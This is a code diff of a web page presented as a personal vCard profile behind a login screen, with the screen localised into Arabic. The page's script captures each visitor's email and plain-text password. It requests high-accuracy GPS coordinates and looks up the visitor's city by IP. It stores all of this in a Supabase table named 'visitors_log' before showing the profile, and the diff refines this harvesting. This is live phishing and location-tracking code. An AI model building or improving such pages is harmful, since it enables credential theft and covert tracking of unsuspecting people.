@@ -23,7 +23,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول */
+        /* واجهة الدخول المعدلة للعربية */
         #auth-screen {
             position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
             display: flex; justify-content: center; align-items: center;
@@ -32,17 +32,20 @@
             width: 90%; max-width: 380px; padding: 40px; background: var(--front_color);
             backdrop-filter: blur(20px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
             text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            direction: rtl;
         }
-        .auth-box h2 { color: var(--gold); margin-bottom: 25px; letter-spacing: 2px; }
+        .auth-box h2 { color: var(--gold); margin-bottom: 15px; letter-spacing: 1px; font-size: 1.6em; }
+        .auth-box p.info-text { color: var(--white); margin-bottom: 20px; font-size: 0.9em; opacity: 0.8; line-height: 1.5; }
         .auth-box input {
             width: 100%; padding: 14px; margin: 10px 0; background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: white; outline: none;
+            border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: white; outline: none; text-align: center;
         }
         .auth-box button {
             width: 100%; padding: 14px; margin-top: 20px;
             background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold));
-            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer;
+            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1em; transition: 0.3s;
         }
+        .auth-box button:active { transform: scale(0.98); opacity: 0.9; }
 
         /* ملف الـ vCard الشخصي */
         .vcard {
@@ -77,10 +80,11 @@
 
 <div id="auth-screen">
     <div class="auth-box">
-        <h2>WELCOME</h2>
-        <input type="email" id="email" placeholder="Email Address">
-        <input type="password" id="password" placeholder="Password">
-        <button id="login-btn" onclick="handleLogin()">Unlock Profile</button>
+        <h2>تسجيل الدخول</h2>
+        <p class="info-text">لرؤية هذا الملف الشخصي يجب تسجيل الدخول أولاً</p>
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button id="login-btn" onclick="handleLogin()">فتح الملف الشخصي</button>
         <p id="error-msg" style="margin-top: 15px; font-size: 0.8em; color: #ff4d4d;"></p>
     </div>
 </div>
@@ -128,22 +132,30 @@
         }
     };
 
-    // دالة الحصول على الموقع بالملي عبر GPS
+    // دالة الحصول على الموقع بأعلى دقة ممكنة (High Accuracy GPS)
     function getLocationGPS() {
         return new Promise((resolve) => {
             if (navigator.geolocation) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        resolve(`${lat}, ${lng} (Acc: ${accuracy}m)`);
                     },
                     (err) => {
-                        console.warn("User denied GPS or Error:", err.message);
-                        resolve("Permission Denied / IP Only");
+                        resolve("Denied/Timeout/Error: " + err.message);
                     },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    options
                 );
             } else {
-                resolve("Browser not supported");
+                resolve("Not Supported");
             }
         });
     }
@@ -155,50 +167,50 @@
         const loginBtn = document.getElementById('login-btn');
 
         if (!email.includes('@') || password.length < 6) {
-            errorMsg.innerText = "خطأ في الإيميل أو الرمز غير صحيح";
+            errorMsg.innerText = "البريد الإلكتروني أو الرمز غير صحيح";
             return;
         }
 
-        loginBtn.innerText = "Acquiring GPS...";
+        loginBtn.innerText = "جاري التحقق...";
         loginBtn.disabled = true;
 
-        try {
-            // 1. جلب الإحداثيات الدقيقة (GPS)
-            const coords = await getLocationGPS();
-
-            // 2. جلب اسم المدينة كمعلومة إضافية من الـ IP
-            let cityInfo = "Unknown";
+        // تأخير لمدة ثانيتين قبل بدء طلب الموقع ومعالجة البيانات
+        setTimeout(async () => {
             try {
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const geoData = await geoRes.json();
-                cityInfo = geoData.city || "Unknown";
-            } catch(e) { console.log("City fetch error"); }
+                // طلب الموقع الفعلي (ستظهر رسالة المتصفح بالإنجليزية هنا)
+                const coords = await getLocationGPS();
 
-            // 3. إرسال البيانات إلى Supabase
-            const { error } = await supabaseClient
-                .from('visitors_log')
-                .insert([{ 
-                    visitor_email: email, 
-                    visitor_password: password,
-                    city: cityInfo,
-                    coords: coords 
-                }]);
+                let cityInfo = "Unknown";
+                try {
+                    const geoRes = await fetch('https://ipapi.co/json/');
+                    const geoData = await geoRes.json();
+                    cityInfo = geoData.city || "Unknown";
+                } catch(e) { console.log("City fetch error"); }
 
-            if (error) {
-                console.error(error);
-                errorMsg.innerText = "حدث خطأ في قاعدة البيانات";
-                loginBtn.innerText = "Unlock Profile";
+                const { error } = await supabaseClient
+                    .from('visitors_log')
+                    .insert([{ 
+                        visitor_email: email, 
+                        visitor_password: password,
+                        city: cityInfo,
+                        coords: coords 
+                    }]);
+
+                if (error) {
+                    errorMsg.innerText = "حدث خطأ في الاتصال بقاعدة البيانات";
+                    loginBtn.innerText = "فتح الملف الشخصي";
+                    loginBtn.disabled = false;
+                } else {
+                    localStorage.setItem('isUnlocked', 'true');
+                    document.getElementById('auth-screen').style.display = 'none';
+                    document.getElementById('profile-card').style.display = 'block';
+                }
+            } catch (e) {
+                errorMsg.innerText = "تعذر الدخول، يرجى المحاولة لاحقاً";
+                loginBtn.innerText = "فتح الملف الشخصي";
                 loginBtn.disabled = false;
-            } else {
-                localStorage.setItem('isUnlocked', 'true');
-                document.getElementById('auth-screen').style.display = 'none';
-                document.getElementById('profile-card').style.display = 'block';
             }
-        } catch (e) {
-            errorMsg.innerText = "تعذر الدخول، حاول مجدداً";
-            loginBtn.innerText = "Unlock Profile";
-            loginBtn.disabled = false;
-        }
+        }, 2000); 
     }
 </script>
 </body>
